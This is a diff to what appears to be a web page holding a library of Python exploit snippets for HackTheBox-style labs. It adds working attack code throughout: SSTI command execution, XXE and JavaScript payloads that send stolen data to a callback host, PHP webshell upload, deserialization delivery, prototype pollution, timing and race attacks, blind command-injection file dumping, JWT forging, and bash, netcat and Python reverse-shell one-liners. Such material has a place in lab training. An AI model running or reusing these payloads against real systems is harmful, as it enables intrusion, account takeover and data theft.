+            "title": "REPLACE exploit() - SSTI Command",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Triggers a template injection payload and verifies command execution output.",
+            "filename": "replace_exploit_ssti_command.py",
+            "code": "SSTI_PATH = \"/render\"              # EDIT\nSSTI_PARAM = \"name\"                # EDIT\n\ndef ssti_payload(cmd):\n    escaped = cmd.replace(\"'\", \"'\\''\")\n    return \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('\" + escaped + \"').read() }}\"\n\ndef run_cmd(cmd):\n    r = s.get(f\"{TARGET}{SSTI_PATH}\", params={SSTI_PARAM: ssti_payload(cmd)}, timeout=TIMEOUT)\n    r.raise_for_status()\n    return r.text.strip()\n\ndef exploit():\n    out = run_cmd(\"id\")\n    print(out)\n    return out\n"
+      },
+      {
+            "id": "exploit-xxe-oob",
+            "title": "REPLACE exploit() - XXE OOB",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Sends an XML payload that causes an out-of-band callback to the listener.",
+            "filename": "replace_exploit_xxe_oob.py",
+            "code": "XML_PATH = \"/api/import\"            # EDIT\n\ndef exploit():\n    dtd_url = f\"http://{CALLBACK_HOST}:{CALLBACK_PORT}/xxe.dtd\"\n    xml = f\"\"\"<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY % ext SYSTEM \"{dtd_url}\">%ext;]>\n<data>&send;</data>\n\"\"\"\n    r = s.post(f\"{TARGET}{XML_PATH}\", data=xml, headers={\"Content-Type\": \"application/xml\"}, timeout=TIMEOUT)\n    print(f\"[+] XXE submitted: {r.status_code}; watch listener\")\n"
+      },
+      {
+            "id": "exploit-upload-webshell",
+            "title": "REPLACE exploit() - File Upload Webshell",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Uploads a small webshell and confirms the command primitive.",
+            "filename": "replace_exploit_file_upload_webshell.py",
+            "code": "UPLOAD_PATH = \"/upload\"             # EDIT\nSHELL_URL = \"/uploads/shell.php\"    # EDIT\nSHELL_FIELD = \"file\"                # EDIT\n\ndef exploit():\n    files = {SHELL_FIELD: (\"shell.php\", build_php_webshell(), \"application/x-php\")}\n    r = s.post(f\"{TARGET}{UPLOAD_PATH}\", files=files, timeout=TIMEOUT)\n    r.raise_for_status()\n    out = run_cmd(\"id\")\n    if not out:\n        raise RuntimeError(\"webshell uploaded but command output is empty\")\n    print(f\"[+] webshell ready: {TARGET}{SHELL_URL}\")\n    print(out)\n"
+      },
+      {
+            "id": "exploit-deserialization-rce",
+            "title": "REPLACE exploit() - Deserialization RCE Delivery",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Delivers a prepared serialized payload to a vulnerable endpoint and checks callback or output.",
+            "filename": "replace_exploit_deserialization_rce_delivery.py",
+            "code": "DESER_PATH = \"/api/import\"          # EDIT\nPAYLOAD_PARAM = \"data\"              # EDIT\n\ndef build_serialized_payload(cmd):\n    # EDIT: replace with lab-specific gadget payload builder.\n    return payload_b64(f\"RUN:{cmd}\")\n\ndef exploit():\n    payload = build_serialized_payload(f\"curl http://{CALLBACK_HOST}:{CALLBACK_PORT}/deser\")\n    r = s.post(f\"{TARGET}{DESER_PATH}\", data={PAYLOAD_PARAM: payload}, timeout=TIMEOUT)\n    print(f\"[+] deserialization payload sent: {r.status_code}\")\n    print(r.text[:500])\n"
+      },
+      {
+            "id": "exploit-phar-trigger",
+            "title": "REPLACE exploit() - PHAR Upload Trigger",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Uploads a prepared PHAR-style payload and triggers a file operation sink.",
+            "filename": "replace_exploit_phar_upload_trigger.py",
+            "code": "UPLOAD_PATH = \"/upload\"             # EDIT\nTRIGGER_PATH = \"/api/image\"         # EDIT\nFILE_PARAM = \"file\"                 # EDIT\nPHAR_NAME = \"payload.phar\"          # EDIT\n\ndef exploit():\n    phar_bytes = open(PHAR_NAME, \"rb\").read()\n    files = {FILE_PARAM: (PHAR_NAME, phar_bytes, \"application/octet-stream\")}\n    r = s.post(f\"{TARGET}{UPLOAD_PATH}\", files=files, timeout=TIMEOUT)\n    r.raise_for_status()\n    uploaded = r.json().get(\"path\", f\"uploads/{PHAR_NAME}\")\n    r = s.get(f\"{TARGET}{TRIGGER_PATH}\", params={FILE_PARAM: f\"phar://{uploaded}\"}, timeout=TIMEOUT)\n    print(f\"[+] trigger status={r.status_code}; watch callback/output\")\n"
+      },
+      {
+            "id": "exploit-prototype-pollution",
+            "title": "REPLACE exploit() - Prototype Pollution Admin Claim",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Sends a JSON prototype pollution payload, then checks whether an admin-only action is reachable.",
+            "filename": "replace_exploit_prototype_pollution_admin_claim.py",
+            "code": "POLLUTE_PATH = \"/api/profile\"       # EDIT\nCHECK_PATH = \"/admin\"               # EDIT\n\ndef exploit():\n    payload = {\n        \"displayName\": \"tester\",\n        \"__proto__\": {\"isAdmin\": True, \"role\": \"admin\"},\n        \"constructor\": {\"prototype\": {\"isAdmin\": True}},\n    }\n    r = s.post(f\"{TARGET}{POLLUTE_PATH}\", json=payload, timeout=TIMEOUT)\n    r.raise_for_status()\n    check = s.get(f\"{TARGET}{CHECK_PATH}\", timeout=TIMEOUT)\n    print(f\"[+] admin check status={check.status_code}\")\n    print(check.text[:800])\n"
+      },
+      {
+            "id": "exploit-timing-attack",
+            "title": "REPLACE exploit() - Timing Secret Guess",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Ranks candidate prefixes by response time when comparison leaks timing.",
+            "filename": "replace_exploit_timing_secret_guess.py",
+            "code": "TIMING_PATH = \"/api/verify\"         # EDIT\nTOKEN_PARAM = \"token\"               # EDIT\nALPHABET = \"abcdef0123456789\"\nMAX_LEN = 64\nSAMPLES = 3\n\ndef score(candidate):\n    total = 0.0\n    for _ in range(SAMPLES):\n        start = time.time()\n        s.post(f\"{TARGET}{TIMING_PATH}\", json={TOKEN_PARAM: candidate}, timeout=TIMEOUT)\n        total += time.time() - start\n    return total / SAMPLES\n\ndef exploit():\n    prefix = \"\"\n    for _ in range(MAX_LEN):\n        ranked = sorted(((score(prefix + c), c) for c in ALPHABET), reverse=True)\n        prefix += ranked[0][1]\n        print(f\"[+] {prefix} ({ranked[0][0]:.4f}s)\")\n    return prefix\n"
+      },
+      {
+            "id": "exploit-race-burst",
+            "title": "REPLACE exploit() - Race Condition Burst",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Fires concurrent requests at a state-changing endpoint to test raceable logic.",
+            "filename": "replace_exploit_race_condition_burst.py",
+            "code": "from concurrent.futures import ThreadPoolExecutor, as_completed\n\nRACE_PATH = \"/api/redeem\"            # EDIT\nTHREADS = 20                         # EDIT\nATTEMPTS = 50                        # EDIT\nBODY = {\"coupon\": \"TEST\"}            # EDIT\n\ndef hit_once(i):\n    r = s.post(f\"{TARGET}{RACE_PATH}\", json=BODY, timeout=TIMEOUT)\n    return i, r.status_code, r.text[:120]\n\ndef exploit():\n    with ThreadPoolExecutor(max_workers=THREADS) as pool:\n        futures = [pool.submit(hit_once, i) for i in range(ATTEMPTS)]\n        for fut in as_completed(futures):\n            print(fut.result())\n"
+      },
+      {
+            "id": "exploit-logic-availability-bypass",
+            "title": "REPLACE exploit() - Logic Bug Availability Bypass",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Separates validation and commit parameters to bypass client-side or stale availability checks.",
+            "filename": "replace_exploit_logic_availability_bypass.py",
+            "code": "CHECK_PATH = \"/api/check\"           # EDIT\nBOOK_PATH = \"/api/book\"             # EDIT\nRESOURCE_ID = \"1\"                   # EDIT\nVALIDATED_VALUE = \"available-slot\"   # EDIT\nCOMMIT_VALUE = \"restricted-slot\"     # EDIT\n\ndef exploit():\n    s.post(f\"{TARGET}{CHECK_PATH}\", json={\"slot\": VALIDATED_VALUE}, timeout=TIMEOUT).raise_for_status()\n    commit = s.post(\n        f\"{TARGET}{BOOK_PATH}\",\n        json={\"resourceId\": RESOURCE_ID, \"validatedSlot\": VALIDATED_VALUE, \"slot\": COMMIT_VALUE},\n        timeout=TIMEOUT,\n    )\n    print(f\"[+] commit status={commit.status_code}\")\n    print(commit.text[:800])\n"
+      },
+      {
+            "id": "exploit-logic-negative-amount",
+            "title": "REPLACE exploit() - Logic Bug Negative Amount",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Tests signed numeric parameters where negative values credit instead of debit.",
+            "filename": "replace_exploit_logic_negative_amount.py",
+            "code": "PAYMENT_PATH = \"/api/purchase\"      # EDIT\nITEM_ID = \"premium\"                 # EDIT\nAMOUNT = -100                       # EDIT\n\ndef exploit():\n    body = {\"itemId\": ITEM_ID, \"quantity\": 1, \"amount\": AMOUNT}\n    r = s.post(f\"{TARGET}{PAYMENT_PATH}\", json=body, timeout=TIMEOUT)\n    r.raise_for_status()\n    print(r.text[:800])\n"
+      },
+      {
+            "id": "exploit-password-reset-missing-token",
+            "title": "REPLACE exploit() - Password Reset Missing Token",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Checks reset flows where the commit endpoint trusts user identity but not reset token state.",
+            "filename": "replace_exploit_password_reset_missing_token.py",
+            "code": "RESET_COMMIT_PATH = \"/api/reset/commit\"  # EDIT\nVICTIM_USER = \"admin\"                    # EDIT\nNEW_PASSWORD = \"ChangeMe123!\"            # EDIT\n\ndef exploit():\n    body = {\"username\": VICTIM_USER, \"password\": NEW_PASSWORD}\n    r = s.post(f\"{TARGET}{RESET_COMMIT_PATH}\", json=body, timeout=TIMEOUT)\n    print(f\"[+] reset commit status={r.status_code}\")\n    print(r.text[:800])\n"
+      },
+      {
+            "id": "exploit-command-injection-sleep-dump",
+            "title": "REPLACE exploit() - Command Injection Sleep Dump",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Dumps a file through blind command injection using sleep as the signal.",
+            "filename": "replace_exploit_command_injection_sleep_dump.py",
+            "code": "CMDI_PATH = \"/api/ping\"             # EDIT\nCMDI_FIELD = \"host\"                 # EDIT\nFILE_PATH = \"/proof.txt\"            # EDIT\nDELAY = 3\nALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-.!@#$%^&*()\"\nMAX_LEN = 120\n\ndef cmdi_is_char(pos, ch):\n    safe = ch.replace(\"'\", \"'\\\\''\")\n    payload = f'127.0.0.1; c=$(cat {FILE_PATH} | head -c {pos} | tail -c 1); [ \"$c\" = \\'{safe}\\' ] && sleep {DELAY}'\n    start = time.time()\n    s.post(f\"{TARGET}{CMDI_PATH}\", json={CMDI_FIELD: payload}, timeout=TIMEOUT + DELAY)\n    return time.time() - start > DELAY - 0.5\n\ndef exploit():\n    out = \"\"\n    for pos in range(1, MAX_LEN + 1):\n        for ch in ALPHABET:\n            if cmdi_is_char(pos, ch):\n                out += ch\n                print(f\"[+] {out}\")\n                break\n        else:\n            return out\n    return out\n"
+      },
+      {
+            "id": "dump-proof-file",
+            "title": "REPLACE dump() - Proof File",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces dump()",
+            "summary": "Reads common proof paths through an existing run_cmd primitive.",
+            "filename": "replace_dump_proof_file.py",
+            "code": "PROOF_PATHS = [\"/home/user/proof.txt\", \"/root/proof.txt\", \"/proof.txt\"]  # EDIT\n\ndef dump():\n    for path in PROOF_PATHS:\n        try:\n            out = run_cmd(f\"cat {path}\").strip()\n            if out:\n                print(f\"[+] {path}: {out}\")\n        except Exception as exc:\n            print(f\"[-] {path}: {exc}\")\n"
+      },
+      {
+            "id": "run-cmd-webshell",
+            "title": "REPLACE run_cmd() - Webshell",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces run_cmd(cmd)",
+            "summary": "Runs a command through a webshell query parameter.",
+            "filename": "replace_run_cmd_webshell.py",
+            "code": "SHELL_URL = \"/uploads/shell.php\"    # EDIT\nCMD_PARAM = \"cmd\"                   # EDIT\n\ndef run_cmd(cmd):\n    r = s.get(f\"{TARGET}{SHELL_URL}\", params={CMD_PARAM: cmd}, timeout=TIMEOUT)\n    r.raise_for_status()\n    return r.text.strip()\n"
+      },
+      {
+            "id": "run-cmd-json-endpoint",
+            "title": "REPLACE run_cmd() - JSON Command Endpoint",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces run_cmd(cmd)",
+            "summary": "Wraps an RCE endpoint that accepts JSON and returns command output.",
+            "filename": "replace_run_cmd_json_endpoint.py",
+            "code": "COMMAND_PATH = \"/api/debug/run\"     # EDIT\nCOMMAND_FIELD = \"cmd\"               # EDIT\nOUTPUT_KEY = \"output\"               # EDIT\n\ndef run_cmd(cmd):\n    r = s.post(f\"{TARGET}{COMMAND_PATH}\", json={COMMAND_FIELD: cmd}, timeout=TIMEOUT)\n    r.raise_for_status()\n    try:\n        return r.json().get(OUTPUT_KEY, \"\")\n    except ValueError:\n        return r.text.strip()\n"
+      },
+      {
+            "id": "build-response-js-exfil",
+            "title": "REPLACE build_response - JS Exfil Payload",
+            "type": "REPLACE",
+            "area": "Listener",
+            "slot": "replaces build_response()",
+            "summary": "Serves JavaScript that reads an internal page and sends base64 data back to the listener.",
+            "filename": "replace_build_response_js_exfil_payload.py",
+            "code": "def build_response(path, query, body):\n    if path == \"/xxe.dtd\":\n        dtd = f\"\"\"<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY send SYSTEM 'http://{CALLBACK_HOST}:{CALLBACK_PORT}/leak?r=%file;'>\">\n%eval;\n\"\"\"\n        return 200, {\"Content-Type\": \"application/xml\"}, dtd.encode()\n\n    js = f\"\"\"fetch('/admin')\n  .then(r => r.text())\n  .then(t => fetch('http://{CALLBACK_HOST}:{CALLBACK_PORT}/leak?r=' + btoa(t)))\n  .catch(e => fetch('http://{CALLBACK_HOST}:{CALLBACK_PORT}/err?r=' + btoa(String(e))));\n\"\"\"\n    return 200, {\"Content-Type\": \"application/javascript\"}, js.encode()\n"
+      },
+      {
+            "id": "helper-csrf-token",
+            "title": "ADD - csrf_token",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Extracts CSRF tokens with BeautifulSoup or a regex fallback.",
+            "filename": "add_csrf_token.py",
+            "code": "import re\n\ndef parse_csrf(html, field_name):\n    try:\n        from bs4 import BeautifulSoup\n        soup = BeautifulSoup(html, \"html.parser\")\n        field = soup.find(\"input\", {\"name\": field_name})\n        if field and field.get(\"value\"):\n            return field[\"value\"]\n    except ImportError:\n        pass\n    pattern = \"name=[\\\"']\" + re.escape(field_name) + \"[\\\"'][^>]*value=[\\\"']([^\\\"']+)\"\n    match = re.search(pattern, html, re.I)\n    if match:\n        return match.group(1)\n    raise RuntimeError(f\"missing CSRF field: {field_name}\")\n"
+      },
+      {
+            "id": "helper-request-debug",
+            "title": "ADD - request_debug",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Prints compact request/response details when adapting a skeleton in Burp.",
+            "filename": "add_request_debug.py",
+            "code": "def request_debug(r, limit=700):\n    req = r.request\n    print(f\"\\n>>> {req.method} {req.url}\")\n    for key, value in req.headers.items():\n        if key.lower() in {\"cookie\", \"authorization\"}:\n            value = \"<redacted>\"\n        print(f\"> {key}: {value}\")\n    if req.body:\n        print(f\"> body: {str(req.body)[:limit]}\")\n    print(f\"<<< {r.status_code}\")\n    print(r.text[:limit])\n    return r\n"
+      },
+      {
+            "id": "helper-encoders",
+            "title": "ADD - encoders",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Small encoding helpers for payloads, callbacks, and URL-safe values.",
+            "filename": "add_encoders.py",
+            "code": "import base64\nimport urllib.parse\n\ndef b64(data):\n    if isinstance(data, str):\n        data = data.encode()\n    return base64.b64encode(data).decode()\n\ndef b64url(data):\n    return b64(data).rstrip(\"=\").replace(\"+\", \"-\").replace(\"/\", \"_\")\n\ndef urlenc(value):\n    return urllib.parse.quote_plus(str(value))\n\ndef payload_b64(value):\n    return b64(value)\n"
+      },
+      {
+            "id": "helper-jwt-forge",
+            "title": "ADD - jwt_forge",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Forges HS256-style JWTs when a weak or known lab secret is available.",
+            "filename": "add_jwt_forge.py",
+            "code": "import base64\nimport hashlib\nimport hmac\nimport json\n\ndef _b64url(raw):\n    return base64.urlsafe_b64encode(raw).decode().rstrip(\"=\")\n\ndef forge_jwt(claims, secret, alg=\"HS256\"):\n    header = {\"typ\": \"JWT\", \"alg\": alg}\n    signing_input = \".\".join([\n        _b64url(json.dumps(header, separators=(\",\", \":\")).encode()),\n        _b64url(json.dumps(claims, separators=(\",\", \":\")).encode()),\n    ])\n    if alg == \"none\":\n        return signing_input + \".\"\n    digest = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()\n    return signing_input + \".\" + _b64url(digest)\n"
+      },
+      {
+            "id": "helper-payload-builder",
+            "title": "ADD - payload_builder",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Central place for payload string builders used by exploit and run_cmd slots.",
+            "filename": "add_payload_builder.py",
+            "code": "def sql_comment(payload):\n    return payload + \"-- -\"\n\ndef shell_escape_single(value):\n    return \"'\" + str(value).replace(\"'\", \"'\\\\''\") + \"'\"\n\ndef curl_callback(path=\"hit\"):\n    return f\"curl -s http://{CALLBACK_HOST}:{CALLBACK_PORT}/{path}\"\n\ndef sleep_if_char(file_path, pos, char, delay):\n    return f'c=$(cat {file_path} | head -c {pos} | tail -c 1); [ \"$c\" = {shell_escape_single(char)} ] && sleep {delay}'\n"
+      },
+      {
+            "id": "helper-revshell-builder",
+            "title": "ADD - revshell_builder",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Builds common reverse shell one-liners for an existing command primitive.",
+            "filename": "add_revshell_builder.py",
+            "code": "def bash_revshell(host, port):\n    return f\"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'\"\n\ndef nc_mkfifo_revshell(host, port):\n    return f\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f\"\n\ndef python_revshell(host, port):\n    return (\n        \"python3 -c 'import os,pty,socket;\"\n        f\"s=socket.socket();s.connect((\\\"{host}\\\",{port}));\"\n        \"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")'\"\n    )\n"
+      },
+      {
+            "id": "helper-json-param-mutator",
+            "title": "ADD - json_param_mutator",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Generates JSON parameter variants for type confusion and validation disparity checks.",
+            "filename": "add_json_param_mutator.py",
+            "code": "def json_param_mutations(key, value):\n    return [\n        {key: value},\n        {key: str(value)},\n        {key: [value]},\n        {key: {\"$ne\": None}},\n        {key: {\"$regex\": f\"^{value}\"}},\n        {key: None},\n        {key: True},\n        {key: -1 if isinstance(value, int) else value},\n    ]\n\ndef try_mutations(path, key, value):\n    for body in json_param_mutations(key, value):\n        r = s.post(f\"{TARGET}{path}\", json=body, timeout=TIMEOUT)\n        print(f\"[{r.status_code}] {body} -> {r.text[:120]}\")\n"
+      },
+      {
+            "id": "helper-file-upload-builder",
+            "title": "ADD - file_upload_builder",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Builds common upload tuples for extension, content-type, and filename bypass tests.",
+            "filename": "add_file_upload_builder.py",
+            "code": "def build_php_webshell(param=\"cmd\"):\n    return f\"<?php system($_GET['{param}'] ?? 'id'); ?>\".encode()\n\ndef upload_variants(name=\"shell\", content=None):\n    content = content or build_php_webshell()\n    return [\n        (f\"{name}.php\", content, \"application/x-php\"),\n        (f\"{name}.php.jpg\", content, \"image/jpeg\"),\n        (f\"{name}.phtml\", content, \"application/octet-stream\"),\n        (f\"{name}.phar\", content, \"application/octet-stream\"),\n    ]\n"
+      },
+      {
+            "id": "helper-oracle-dump",
+            "title": "ADD - oracle_dump_helpers",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Reusable boolean oracle dump helpers for length, ASCII, and strings.",
+            "filename": "add_oracle_dump_helpers.py",
+            "code": "def dump_length(oracle, expr, max_len=200):\n    for n in range(max_len + 1):\n        if oracle(f\"LEN(({expr}))={n}\"):\n            return n\n    raise RuntimeError(\"length not found\")\n\ndef dump_ascii(oracle, expr, pos):\n    low, high = 32, 126\n    while low <= high:\n        mid = (low + high) // 2\n        if oracle(f\"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}\"):\n            low = mid + 1\n        else:\n            high = mid - 1\n    return chr(low) if 32 <= low <= 126 else \"\"\n\ndef dump_string(oracle, expr, length):\n    out = \"\"\n    for pos in range(1, length + 1):\n        out += dump_ascii(oracle, expr, pos)\n        print(f\"[+] {out}\")\n    return out\n"
+      },
+      {
+            "id": "helper-report-proof",
+            "title": "ADD - report_proof_helpers",
+            "type": "ADD",
+            "area": "Helper",
+            "slot": "helper",
+            "summary": "Prints command and HTTP evidence in a consistent report-friendly format.",
+            "filename": "add_report_proof_helpers.py",
+            "code": "def proof(label, value):\n    print(\"\\n\" + \"=\" * 72)\n    print(f\"[PROOF] {label}\")\n    print(\"=\" * 72)\n    print(value if value is not None else \"<empty>\")\n\ndef proof_response(label, r, limit=1200):\n    proof(label, f\"URL: {r.url}\\nStatus: {r.status_code}\\n\\n{r.text[:limit]}\")\n"
+      },
+      {
+            "id": "example-blind-sqli-full-chain",
+            "title": "HTB EXAMPLE - Blind SQLi Full Chain",
+            "type": "HTB EXAMPLE",
+            "area": "Example",
+            "slot": "complete example",
+            "summary": "Complete sanitized boolean SQLi chain showing oracle and dump flow.",
+            "filename": "example_blind_sqli_full_chain.py",
+            "code": "#!/usr/bin/env python3\nimport requests\nfrom urllib.parse import quote_plus\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nTRUE_MARKER = \"taken\"               # EDIT\nSQLI_PATH = \"/api/check\"            # EDIT\nSQLI_PARAM = \"u\"                    # EDIT\nTARGET_USER = \"admin\"               # EDIT\nQUERY = \"SELECT password FROM users WHERE username='admin'\"  # EDIT\n\ns = requests.Session()\ns.proxies = PROXY\ns.verify = False\n\ndef oracle(condition):\n    inj = quote_plus(f\"{TARGET_USER}' AND ({condition})-- -\")\n    r = s.get(f\"{TARGET}{SQLI_PATH}?{SQLI_PARAM}={inj}\")\n    return TRUE_MARKER in r.text\n\ndef main():\n    out = \"\"\n    for pos in range(1, 81):\n        for c in range(32, 127):\n            if oracle(f\"ASCII(SUBSTRING(({QUERY}),{pos},1))={c}\"):\n                out += chr(c)\n                print(out)\n                break\n        else:\n            break\n\nif __name__ == \"__main__\":\n    main()\n"
+      },
+      {
+            "id": "example-nosql-regex-full-chain",
+            "title": "HTB EXAMPLE - NoSQL Regex Dump",
+            "type": "HTB EXAMPLE",
+            "area": "Example",
+            "slot": "complete example",
+            "summary": "Complete sanitized NoSQL regex oracle script derived from HTB-style skeleton structure.",
+            "filename": "example_nosql_regex_dump.py",
+            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nPATH = \"/index.php\"                 # EDIT\nFIELD = \"trackingNum\"               # EDIT\nTRUE_MARKER = \"valid\"               # EDIT\nPREFIX = \"\"\nALPHABET = \"0123456789abcdef{}-\"\n\ns = requests.Session()\ns.proxies = PROXY\n\ndef oracle(value):\n    r = s.post(f\"{TARGET}{PATH}\", json={FIELD: value})\n    return TRUE_MARKER in r.text\n\ndef main():\n    value = PREFIX\n    for _ in range(80):\n        for ch in ALPHABET:\n            if oracle({\"$regex\": \"^\" + value + ch}):\n                value += ch\n                print(value)\n                break\n        else:\n            break\n    print(f\"Final: {value}\")\n\nif __name__ == \"__main__\":\n    main()\n"
+      },
+      {
+            "id": "example-upload-webshell-full-chain",
+            "title": "HTB EXAMPLE - Upload Webshell RCE",
+            "type": "HTB EXAMPLE",
+            "area": "Example",
+            "slot": "complete example",
+            "summary": "Complete sanitized upload-to-command-execution chain.",
+            "filename": "example_upload_webshell_rce.py",
+            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nUPLOAD_PATH = \"/upload\"             # EDIT\nSHELL_URL = \"/uploads/shell.php\"    # EDIT\n\ns = requests.Session()\ns.proxies = PROXY\ns.verify = False\n\ndef build_shell():\n    return b\"<?php system($_GET['cmd'] ?? 'id'); ?>\"\n\ndef run_cmd(cmd):\n    r = s.get(f\"{TARGET}{SHELL_URL}\", params={\"cmd\": cmd})\n    r.raise_for_status()\n    return r.text.strip()\n\ndef main():\n    files = {\"file\": (\"shell.php\", build_shell(), \"application/x-php\")}\n    s.post(f\"{TARGET}{UPLOAD_PATH}\", files=files).raise_for_status()\n    print(run_cmd(\"id\"))\n    print(run_cmd(\"cat /proof.txt\"))\n\nif __name__ == \"__main__\":\n    main()\n"
+      },
+      {
+            "id": "example-oob-callback-full-chain",
+            "title": "HTB EXAMPLE - OOB Callback Chain",
+            "type": "HTB EXAMPLE",
+            "area": "Example",
+            "slot": "complete example",
+            "summary": "Complete sanitized chain for triggering an OOB callback and collecting evidence in the listener.",
+            "filename": "example_oob_callback_chain.py",
+            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nCALLBACK_HOST = \"127.0.0.1\"         # EDIT\nCALLBACK_PORT = 8000                # EDIT\nTRIGGER_PATH = \"/api/import\"        # EDIT\n\ns = requests.Session()\ns.verify = False\n\ndef exploit():\n    xml = f\"\"\"<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://{CALLBACK_HOST}:{CALLBACK_PORT}/hit\">]>\n<data>&xxe;</data>\n\"\"\"\n    r = s.post(f\"{TARGET}{TRIGGER_PATH}\", data=xml, headers={\"Content-Type\": \"application/xml\"})\n    print(f\"submitted: {r.status_code}\")\n\nif __name__ == \"__main__\":\n    exploit()\n"
+      },
+      {
+            "id": "example-logic-bug-full-chain",
+            "title": "HTB EXAMPLE - Parameter Logic Bug Chain",
+            "type": "HTB EXAMPLE",
+            "area": "Example",
+            "slot": "complete example",
+            "summary": "Complete sanitized logic-bug script showing validation/commit disparity and proof printing.",
+            "filename": "example_parameter_logic_bug_chain.py",
+            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nCHECK_PATH = \"/api/check\"           # EDIT\nCOMMIT_PATH = \"/api/commit\"         # EDIT\n\ns = requests.Session()\ns.proxies = PROXY\ns.verify = False\n\ndef main():\n    valid = {\"slot\": \"normal\", \"amount\": 1}\n    changed = {\"slot\": \"restricted\", \"amount\": -100}\n    check = s.post(f\"{TARGET}{CHECK_PATH}\", json=valid)\n    print(f\"check: {check.status_code} {check.text[:200]}\")\n    commit = s.post(f\"{TARGET}{COMMIT_PATH}\", json={**valid, **changed})\n    print(f\"commit: {commit.status_code}\")\n    print(commit.text[:1000])\n\nif __name__ == \"__main__\":\n    main()\n"
       }
-    ];
+];
 
     const typeClasses = {
       "START HERE": "type-start",
@@ -956,7 +1068,7 @@ if __name__ == "__main__":
     });
 
     download.addEventListener("click", () => {
-      const blob = new Blob([activeScript.code.trim() + "\n"], { type: "text/x-python" });
+      const blob = new Blob([activeScript.code.trim() + "\n"], { type: "text/plain" });
       const url = URL.createObjectURL(blob);
       const link = document.createElement("a");
       link.href = url;
